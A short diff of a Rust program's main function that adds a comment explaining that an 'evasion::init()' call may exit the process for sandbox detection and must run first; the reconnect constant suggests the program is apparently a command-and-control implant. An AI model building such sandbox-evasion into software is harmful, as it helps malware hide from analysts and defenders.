@@ -42,6 +42,9 @@ const RECONNECT_JITTER: f64 = 0.25;
 
 #[tokio::main]
 async fn main() -> anyhow::Result<()> {
+    // IMPORTANT: evasion::init() may call std::process::exit(0) for sandbox detection.
+    // It must remain the first statement. Do not insert anything before this line
+    // that allocates Drop resources or opens handles.
     evasion::init();
 
     // Install ring as the default rustls crypto provider. Required when both
